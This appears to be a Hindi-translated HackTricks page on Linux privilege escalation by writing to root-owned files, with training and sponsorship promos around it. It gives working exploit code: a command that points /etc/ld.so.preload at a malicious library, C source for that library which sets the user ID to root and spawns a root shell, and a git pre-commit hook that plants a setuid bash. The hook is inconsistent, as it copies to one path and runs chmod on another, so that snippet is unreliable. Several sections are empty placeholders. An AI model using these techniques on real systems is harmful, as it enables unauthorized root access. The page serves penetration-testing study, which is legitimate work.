# अनिवार्य फ़ाइल रूट में लिखें

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फ़ॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** env वेरिएबल की तरह व्यवहार करती है लेकिन यह **SUID binaries** में भी काम करती है।\
यदि आप इसे बना सकते हैं या संशोधित कर सकते हैं, तो आप बस हर एक निष्पादित बाइनरी के साथ लोड होने वाली एक **पुस्तकालय का पथ जोड़ सकते हैं**।

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### गिट हुक्स

[**गिट हुक्स**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) वे **स्क्रिप्ट्स** हैं जो गिट रिपॉजिटरी में विभिन्न **घटनाओं** पर **चलाए जाते हैं** जैसे कि जब एक कमिट बनाया जाता है, एक मर्ज... इसलिए अगर **विशेषाधिकारी स्क्रिप्ट या उपयोगकर्ता** इस क्रिया को अक्सर कर रहा है और **`.git` फ़ोल्डर** में **लिखना संभव** है, तो इसका उपयोग **प्रिवेस्क** के लिए किया जा सकता है।

उदाहरण के लिए, एक स्क्रिप्ट **उत्पन्न करना संभव है** एक गिट रिपॉ में **`.git/hooks`** में ताकि यह हमेशा नए कमिट बनाया जाता है जब निष्पादित हो:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### क्रॉन और समय फ़ाइलें

करने के लिए

### सेवा और सॉकेट फ़ाइलें

करने के लिए

### binfmt\_misc

`/proc/sys/fs/binfmt_misc` में स्थित फ़ाइल यह दर्शाती है कि कौन सी बाइनरी किस प्रकार की फ़ाइल को चलानी चाहिए। करने के लिए: इसका दुरुपयोग करने के लिए जांचें कि जब एक सामान्य फ़ाइल प्रकार खुला होता है तो एक रिवर्स शैल को कैसे चलाया जा सकता है।

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फ़ॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
